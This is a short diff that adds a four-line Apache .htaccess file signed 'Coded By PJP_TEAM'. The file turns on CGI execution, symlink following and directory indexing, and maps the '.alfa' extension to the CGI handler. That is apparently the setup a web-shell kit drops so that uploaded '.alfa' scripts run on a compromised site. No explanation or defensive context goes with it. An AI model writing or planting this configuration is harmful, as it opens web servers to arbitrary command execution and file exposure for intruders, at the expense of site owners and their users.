@@ -1,0 +1,4 @@
+#Coded By PJP_TEAM
+Options FollowSymLinks MultiViews Indexes ExecCGI
+AddType application/x-httpd-cgi .alfa
+AddHandler cgi-script .alfa
